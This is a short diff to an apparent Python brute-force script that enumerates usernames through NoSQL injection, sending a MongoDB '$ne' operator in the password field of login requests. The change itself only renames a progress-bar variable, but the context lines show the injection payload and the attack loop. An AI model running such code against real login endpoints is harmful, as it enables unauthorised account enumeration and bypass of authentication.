@@ -26,8 +26,8 @@ def makeRequest(url, proxy_url=None, output_file="usernames.txt"):
     characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
     file_created = False
     
-    p1 = log.progress("Enumerating users")
-    p1.status("Starting brute-force attack")
+    progress_bar = log.progress("Enumerating users")
+    progress_bar.status("Starting brute-force attack")
     
     while True:
         character_found = False
@@ -46,7 +46,7 @@ def makeRequest(url, proxy_url=None, output_file="usernames.txt"):
                 'password': {'$ne': ''}
             }
             
-            p1.status(data)
+            progress_bar.status(data)
             
             try:
                 request = session.post(url, json=data, allow_redirects=False, timeout=300)
